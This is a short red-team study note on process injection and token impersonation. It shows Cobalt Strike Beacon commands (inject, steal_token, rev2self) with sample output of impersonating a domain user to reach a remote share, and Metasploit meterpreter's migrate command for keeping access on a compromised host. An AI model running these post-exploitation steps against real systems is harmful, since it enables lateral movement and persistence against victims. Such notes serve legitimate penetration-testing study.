# [[Process Injection]]  
___

## Description:  

### In Cobalt Strike

TheÂ `inject`Â command will inject a Beacon payload in the form of shellcode into a target process. You can inject into processes owned by the current user without needing elevation, but local admin privileges are required to inject into processes owned by other users. If you inject into a process owned by a different user, your Beacon will run with all the local and domain privileges of that user.


```
beacon> ps

```


TheÂ `steal_token`Â command will impersonate the access token of the target process. LikeÂ `make_token`, it's good for access resources across a network but not local actions. UseÂ `rev2self`Â to drop the impersonation. This command opens a handle to the target process in order to duplicate and impersonate the access token, and therefore requires local admin privileges.

```
beacon> ls \\srv-2\c$
[-] could not open \\srv-2\c$\*: 5

beacon> steal_token 3320
[+] Impersonated DEV\jking

beacon> ls \\srv-2\c$

```

### In Metasploit

When we compromise a host, our meterpreter payload is executed inside the process of the 
application we attack. If the victim closes that process, our access to the machine is closed as well.

```
meterpreter > ps

meterpreter > migrate 3568
[*] Migrating from 3164 to 3568...
[*] Migration completed successfully.
```
